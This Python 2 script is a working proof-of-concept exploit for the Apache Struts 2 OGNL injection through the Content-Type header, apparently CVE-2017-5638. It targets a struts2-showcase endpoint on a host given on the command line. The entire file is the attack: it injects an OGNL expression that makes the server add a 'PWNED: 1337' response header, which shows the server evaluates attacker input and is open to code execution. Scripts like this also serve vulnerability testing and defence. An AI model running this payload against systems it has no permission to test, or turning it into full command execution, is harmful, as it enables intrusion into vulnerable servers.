#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib2
import httplib

def exploit(host):
    ognl_payload = ".multipart/form-data~${"
    ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
    ognl_payload += "}"
    if not ":" in host:
        host = "{}:8080".format(host)

    url = "http://{}/struts2-showcase-2.3.12/showcase.action".format(host)
    print "\nInjecting Header PWNED: 1337"

    headers = {'Content-Type': ognl_payload}
    request = urllib2.Request(url, headers=headers)
    response = urllib2.urlopen(request)
    print "\n\n", response.headers

if len(sys.argv) < 2:
    sys.exit('Usage: %s <host:port>' % sys.argv[0])
else:
    exploit(sys.argv[1])
